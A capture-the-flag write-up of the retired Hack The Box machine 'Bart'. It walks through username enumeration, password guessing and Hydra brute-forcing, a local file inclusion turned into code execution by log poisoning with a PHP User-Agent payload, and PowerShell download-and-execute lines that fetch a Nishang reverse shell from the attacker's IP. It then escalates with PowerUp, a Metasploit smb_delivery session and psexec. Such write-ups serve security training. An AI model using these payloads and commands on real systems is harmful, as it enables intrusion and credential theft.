# Bart

This is the write-up for the box Bart that got retired at the 14th July 2018.
My IP address was 10.10.14.19 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.81    bart.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/bart.nmap 10.10.10.81
```

```markdown
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://forum.bart.htb/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking HTTP (Port 80)

The web page wants to automatically forward to _forum.bart.htb_ so after putting that into the _/etc/hosts_ file, the forwarding works.
It is built with **WordPress**, but all the default WordPress pages in the source are removed.

There are some potential usernames on the homepage, when looking at the mail addresses of _"Our Team"_ and one in the _"New employee"_ news:
- Samantha Brown _(s.brown)_
- Daniel Simmons _(d.simmons)_
- Robert Hilton _(r.hilton)_
- Daniella Lamborghini _(d.lamborghini)_

In the HTML source is a block of code commented out:
```markdown
(...)
<div class="name">Harvey Potter</div>
<div class="pos">Developer@BART</div>
(...)
<li><a class="mail" href="mailto:h.potter@bart.htb" target="_blank"><i class="fa">M</i></a></li>
(...)
```

The user _h.potter_ is the developer of the website and another potential username.

Lets search for hidden directories on the IP with **Gobuster**:
```markdown
gobuster -u http://10.10.10.81 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 204,301,302,307
```

It finds the directory _/forum_ which is the site from before and the directory _/monitor_ with a login form:

![Monitor login form](https://kyuu-ji.github.io/htb-write-up/bart/bart_web-1.png)

### Getting Access to Development Tools

When using the _"Forgot password"_ feature, it asks for a username and after providing an incorrect one, it responds with _"The provided username could not be found"_ which can be used as a way to enumerate valid usernames.

After trying different variations of the developers name _(Harvey Potter)_, the username _harvey_ exists as the login form responded that it will send an email to reset the password.
As the request is protected with a **CSRF-token**, brute-forcing the password with tools is difficult.
In this case manually trying out different easy passwords work and the password of the user is his last name:
> potter

The login wants to forward to _monitor.bart.htb_, so also putting that into the _/etc/hosts_ file and the forwarding works.

On _Servers_ there is one entry for _internal-01.bart.htb_ that has to be put into the _/etc/hosts_ file to get to it:

![Server monitor](https://kyuu-ji.github.io/htb-write-up/barts/bart_web-2.png)

It forwards to another login form with the title _"[DEV] Internal Chat Login Form"_:

![Chat login form](https://kyuu-ji.github.io/htb-write-up/bart/bart_web-3.png)

The default credentials from before don't work, but luckily this is not protected with a **CSRF-token** and can be brute-forced with **Hydra**:
```markdown
hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password"
```

After a while the password for the username _harvey_ in this login form is found:
> Password1

It forwards to a chat program:

![Chat application](https://kyuu-ji.github.io/htb-write-up/bart/bart_web-4.png)

In the HTML source is a path in which this program seems to log into:
```markdown
(...)
xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
(...)
```

It is possible to browse to this path, but it shows nothing.
By changing the _filename_ parameter to _log.php_, the log file is readable via a **Local File Inclusion** and it logs our User-Agent:
```markdown
http://internal-01.bart.htb/log/log.php?filename=log.php&username=harvey
```
```markdown
[2021-01-01 21:25:29] - harvey - Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
```

### Log Poisoning

Lets send this to a proxy tool like **Burpsuite** to modify the HTTP request.
By changing our User-Agent to PHP code, it is possible to execute arbitrary code:
```markdown
GET /log/log.php?filename=log.php&username=harvey HTTP/1.1
Host: internal-01.bart.htb
User-Agent: <?php system($_REQUEST['test']); ?>
```
```markdown
# Response

system(): Cannot execute a blank command in
C:\inetpub\wwwroot\internal-01\log\log.php</b>
```

This is known as **Log Poisoning** and now it accepts code with the _test_ parameter, we created:
```markdown
GET /log/log.php?filename=log.php&username=harvey&test=whoami HTTP/1.1
Host: internal-01.bart.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
```
```markdown
# Response

[2021-01-01 21:31:54] - harvey - nt authority\iusr
```

It shows the result of `whoami`, so command execution works and uploading files and getting a reverse shell connection should be possible.
The _shell.ps1_ file is the script _Invoke-PowerShellTcp.ps1_ from the **Nishang scripts** with the following line at the bottom:
```markdown
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 9001
```

Uploading the file:
```markdown
GET /log/log.php?filename=log.php&username=harvey&test=powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.19/shell.ps1')"
```

After URL-encoding the command and sending the request, the listener on my IP and port 9001 starts a reverse shell connection as _NT Authority\iusr_.

This box is a 64-bit machine but our process runs as a 32-bit process:
```markdown
\[environment]::Is64BitOperatingSystem
True
\[environment]::Is64BitProcess
False
```

Lets run **PowerShell from SysNative** to get a 64-bit process:
```markdown
GET /log/log.php?filename=log.php&username=harvey&test=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.19/shell.ps1')"
```

After URL-encoding the command and sending the request, the listener on my IP and port 9001 starts a reverse shell connection as _NT Authority\iusr_ in a 64-bit process.

## Privilege Escalation

To get an attack surface, it is recommended to run any **Windows Enumeration Script**:
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.19/PowerUp.ps1')

Invoke-AllChecks
```

It found credentials in the **Autologon** registry entry:
```markdown
[*] Checking for Autologon credentials in registry...

DefaultDomainName    : DESKTOP-7I3S68E
DefaultUserName      : Administrator
DefaultPassword      : 3130438f31186fbaf962f407711faddb
```

Even though this looks like a **MD5 hash**, it is not, it is the actual password for the machine.
If we could run `RunAs`, it would be possible to execute commands with higher privileges.

To connect to the box through **PSExec**, the port 445 (SMB) has to be open. This can be done by starting a **Meterpreter session** and forward the port to our local client.

Setup in **Metasploit**:
```markdown
use exploit/windows/smb/smb_delivery

set SHARE MyShare
set SRVHOST 10.10.14.19
set LHOST tun0
set LPORT 9002

exploit -j
```

Running the DLL file on the box to get a **Meterpreter** session:
```markdown
rundll32.exe \\10.10.14.19\MyShare\test.dll,0
```

Port forwarding port 445 (SMB):
```markdown
sessions -i 1

meterpreter > portfwd add -l 445 -p 445 -r 127.0.0.1
```

Running **Impackets PSexec** to connect to the box with the credentials:
```markdown
impacket-psexec Administrator:3130438f31186fbaf962f407711faddb@127.0.0.1
```

After running this, a shell session as _NT Authority\SYSTEM_ starts!
